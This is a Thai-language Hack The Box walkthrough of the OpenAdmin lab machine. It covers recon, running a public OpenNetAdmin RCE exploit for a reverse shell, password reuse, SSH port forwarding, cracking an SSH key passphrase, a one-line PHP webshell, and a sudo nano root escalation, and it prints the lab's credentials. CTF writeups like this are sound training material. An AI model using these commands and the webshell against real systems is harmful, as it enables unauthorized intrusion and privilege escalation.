---
title: "[Writeup] Hack The Box: OpenAdmin (Thai Version)"
date: 2020-04-29T23:39:11+07:00
categories: [writeup]
tags: [writeup, walkthrough, htb, hackthebox, th, ภาษาไทย]
---

สำหรับวันนี้ เรามาลองดูเครื่องที่ชื่อว่า OpenAdmin ใน Hack The Box กันนะครับ เครื่องนี้เป็นเครื่องระดับง่าย ที่มือใหม่ก็น่าจะพอเล่นกันผ่านได้โดยไม่ยากครับ

![](/images/htb_openadmin/infocard.png)

<!--more-->

**OS:** Linux  
**Difficulty:** Easy  
**Points:** 20  
**Release:** 04 Jan 2020  
**IP:** 10.10.10.171  
**Date Cleared:** 20 Apr 2020

**[Click here to read the English version of this writeup](/writeup/htb_openadmin/)**

## Information Gathering

เริ่มต้นด้วยการ `nmap` เพื่อดูว่ามี port ไหนเปิดอยู่บ้าง จะเห็นว่ามี `ssh` เปิดอยู่ที่ port 22 และ `http` ที่ port `80`

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Port 80

เมื่อเข้ามาที่ port `80` ด้วย web browser เราจะเจอกับหน้า Apache2 Default Page อยู่ที่หน้าแรก

![](/images/htb_openadmin/80_home.png)

เราสามารถใช้ `gobuster` เพื่อทำ directory fuzzing หา path ที่ซ่อนอยู่ จะเห็นว่าเราเจอ path ที่เข้าถึงได้ 3 อันจาก wordlist `big.txt`

![](/images/htb_openadmin/80_gobuster.png)

ลองเข้าไปดูแต่ละอัน ก็จะเจอกับหน้าเว็บที่เหมือนจะก็อปมาจาก template ดูไม่มีอะไรสำคัญเท่าไหร่

![](/images/htb_openadmin/80_artwork.png)

![](/images/htb_openadmin/80_sierra.png)

![](/images/htb_openadmin/80_music.png)

แต่ในหน้า music เมื่อเราลองดูที่ปุ่ม Login จะเจอว่ามัน link ไปที่หน้า <http://10.10.10.171/ona> ที่มี `OpenNetAdmin 18.1.1` อยู่

![](/images/htb_openadmin/80_ona.png)

พอลองเอาไปหาใน Google จะเห็นว่ามีช่องโหว่ RCE อยู่

![](/images/htb_openadmin/ona_rce.png)

## Exploitation

ลองโหลด exploit script จาก <https://raw.githubusercontent.com/amriunix/ona-rce/master/ona-rce.py> มาบนเครื่อง แล้วรันด้วย `python3 ona-rce.py exploit http://10.10.10.171/ona/` จะทำให้เราได้ reverse shell ของ user `www-data`

![](/images/htb_openadmin/80_ona_rev.png)

เมื่อลองไล่ดูในไฟล์ของเว็บ จะเจอกับ config file นึง ที่มี database password `n1nj4W4rri0R!`

![](/images/htb_openadmin/dbsetting.png)

จาก home directory เราจะ เห็น user อยู่ 2 account ได้แก่ `jimmy` และ `joanna` เมื่อลองเอา password ที่เจอก่อนหน้านี้มาใช้ จะพบว่า password นี้สามารถใช้ login เข้า user `jimmy` ได้

![](/images/htb_openadmin/user.png)

พอเราได้ username และ password เราก็เปลี่ยนไปใช้ `ssh` เพื่อต่อไปยัง server ตรง ๆ ได้เลย ไม่ต้องผ่าน reverse shell

พอลองไล่ดูไฟล์สักพัก ก็ไปเจอกับ directory นึงที่ชื่อว่า `/var/www/internal` ที่ `jimmy` เป็น owner

![](/images/htb_openadmin/internal.png)

ลองอ่านไฟล์ดู จะเห็นว่าหน้า `index.php` จะมี login form อยู่ โดย username ต้องเป็น `jimmy` และ `sha512` hash ของ password ต้องตรงกับที่ระบุไว้

![](/images/htb_openadmin/internal_index.png)

หน้า `main.php` จะมีการอ่านไฟล์ ssh private key ของ `joanna`

![](/images/htb_openadmin/internal_main.png)

พอเห็นแบบนี้ ก็พอจะเดาได้ว่าเราต้องหา password ที่ถูกต้องเพื่อ login เข้าไปในหน้า `main.php` แล้วเอา private key ของ `joanna` ออกมา แล้วใช้ key นั้นในการ `ssh` เข้าเป็น `joanna`

เริ่มต้นจาก password ลองใช้เว็บ <https://crackstation.net/> เพื่อ crack hash ที่ได้มา โชคดีที่ password เป็นคำง่าย ๆ ที่มีอยู่ใน wordlist ที่เว็บนี้ใช้ เลย crack ออกมาได้

ได้ password เป็นคำว่า `Revealed`

![](/images/htb_openadmin/internal_index_crack.png)

เราต้องรู้ก่อนว่าหน้าเว็บนี้ host อยู่บน port อะไร จากในตอนแรกจะเห็นว่า web server เป็น `Apache` สามารถไปดู config file ได้ใน `/etc/apache2/` จะเจอว่า `/var/www/internal` ถูก host อยู่บน port `52846`

![](/images/htb_openadmin/internal_apache.png)


....เอ้า? ไหนตอนแรกบอก `nmap` มาเจอแค่ `22` กับ `80` ไง? 

ก็ใช่น่ะสิครับ เว็บมันเปิด listen อยู่แค่บนเครื่องตัวเองเป็น internal ไม่ได้เปิดให้ข้างนอกเข้าถึงได้

**แต่ว่า!!!** ถ้าเรามาอ่าน code ของไฟล์ `main.php` ใหม่ดี ๆ

```php
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

จะเห็นว่า ไม่ว่าเราจะ login หรือไม่ก็ตาม private key ก็จะถูก output มาอยู่ดี แค่ถ้าไม่ได้ login ก็จะมีการ redirect กลับไป `index.php`

ดังนั้น เราสามารถใช้ `curl` เพื่อเข้าถึงหน้าเว็บนั้นตรง ๆ จากบนเครื่องเป้าหมายได้เลย

![](/images/htb_openadmin/internal_curlpriv.png)

อ่าว แล้วแบบนี้ ถ้าเราอยากเข้าไปดูหน้าเว็บสวย ๆ ด้วย web browser ของเรา อยากลองกรอกฟอร์ม login ดี ๆ ไม่อยากจ้องแต่ code ของหน้าเว็บ จะทำยังไงดีล่ะ?

ในเมื่อเรารู้ username และ password ของ `jimmy` เราสามารถใช้ `ssh` เพื่อทำ `Local Port Forwarding` จาก port นึงบนเครื่องเรา ไปยังปลายทางผ่านเครื่องที่เรา `ssh` ไปหาได้

โดย command ในการทำ `Local Port Forwarding` คือ `ssh -L local_port:destination_ip:destination_port username@ssh_server_ip`

ซึ่งในกรณีนี้ สมมุติว่าเราอยาก forward จาก port `80` บนเครื่องเรา (local_port) ผ่านเครื่องที่เรา `ssh` ไปหาซึ่งก็คือ `10.10.10.171` (ssh_server_ip) จากนั้นให้เครื่องนั้น forward ต่อไปที่เครื่องนั้นเอง `127.0.0.1` (destination_ip) ที่ port `52846` (destination_port) โดยใช้ user `jimmy` (username)

ดังนั้นเราต้องใช้ command `ssh -L 80:127.0.0.1:52846 jimmy@10.10.10.171`

![](/images/htb_openadmin/internal_localforward.png)

จากนั้น เราจะสามารถใช้ web browser บนเครื่องเรา เข้าไปที่ port `80` บนเครื่องเราเอง ตัว request จะถูก forward ไปที่เว็บปลายทาง ทำให้เราสามารถเข้าถึงหน้าเว็บได้

![](/images/htb_openadmin/internal_localhost.png)

ลอง login ด้วย `jimmy:Revealed`

![](/images/htb_openadmin/internal_login.png)

วิธีนี้ ทำให้เราเข้าถึง private key ของ `joanna` ได้ผ่าน web browser

![](/images/htb_openadmin/internal_privkey.png)

พอได้ key มาแล้ว ให้เรา copy มาไว้ในไฟล์บนเครื่องเราได้เลย โดยเราตั้งชื่อว่า `privkey` จากนั้นเราสามารถใช้ key เพื่อ `ssh` ไปยังเครื่องเป้าหมายด้วย user `joanna` ด้วย command `ssh -i privkey joanna@10.10.10.171` ได้เลย... รึเปล่า?

**ยัง! ต้องมี passphrase สำหรับใช้ key อีก!**

![](/images/htb_openadmin/joanna_pass.png)

แล้วเราจะหา passphrase มาจากไหนล่ะ? มาลอง crack ด้วย `rockyou.txt` โดยใช้ `john`

เราสามารถแปลง private key ให้อยู่ใน format ที่ `john` สามารถ crack ได้ด้วย command `python /usr/share/jogn/ssh2john.py privkey > privkey.hash` จากนั้นเริ่ม crack ด้วย command `john privkey.hash --wordlist=/usr/share/wordlists/rockyou.txt`

**และแล้วเราก็ได้ passphrase!**

![](/images/htb_openadmin/internal_privkey_crack.png)

ในที่สุด เราก็จะ `ssh` ไปที่เครื่องปลายทางได้ด้วย private key ที่ได้มา และใช้ passphrase เป็น `bloodninjas`

![](/images/htb_openadmin/joanna_ssh.png)

### Another Solution

มีอีกวิธีที่เราใช้ในการเข้าถึง `joanna` ได้ ถ้ากลับไปดู เราจะเห็นว่า `jimmy` เป็น owner ของ directory `/var/www/internal` เท่ากับว่าเราสามารถเขียนไฟล์ หรือแก้ไฟล์ในนี้ได้เลย

![](/images/htb_openadmin/internal.png)

เราสามารถเขียน PHP webshell ง่าย ๆ ไว้ในนั้น โดยใช้ command `echo '<?php echo shell_exec($_GET["cmd"]); ?>' > cmd.php` จากนั้นเราก็ใช้ `curl` เพื่อรัน command ด้วยสิทธิ์ของ `joanna` ได้เลย โดยใช้ command `curl localhost:52846/cmd.php?cmd=[COMMAND]`

![](/images/htb_openadmin/internal_joannacmd.png)

เราอาจใช้วิธีนี้ในการดึง private key ออกมา หรือเอา public key ของเครื่องเราไปใส่ไว้ใน `/home/joanna/.ssh/authorized_keys` ก็ได้

## Privilege Escalation

การ escalate บนเครื่องนี้ค่อนข้างจะตรงไปตรงมา ลองใช้ `sudo -l` จะเห็นว่าเรารัน `nano` ด้วยสิทธิ์ `root` ได้โดยไม่ต้องใช้ password

![](/images/htb_openadmin/joanna_nano.png)

จากเว็บ <https://gtfobins.github.io/gtfobins/nano/> เราจะเห็นว่าเราสามารถใช้ `sudo` กับ `nano` เพื่อ escalate เป็น `root` ได้เลย

![](/images/htb_openadmin/gtfobins.png)

ลองรัน `nano` ด้วย `sudo`

![](/images/htb_openadmin/priv1.png)

กด `Ctrl-R` แล้วกด `Ctrl-X`

![](/images/htb_openadmin/priv2.png)

พิมพ์ `reset; sh 1>&0 2>&0` จากนั้นกด `Enter`

![](/images/htb_openadmin/priv3.png)

กด `Enter` สักสองสามทีเพื่อเคลียร์จอ จะเห็นว่าเราได้ยกสิทธิ์ตัวเองเป็น `root` เรียบร้อย

![](/images/htb_openadmin/root.png)
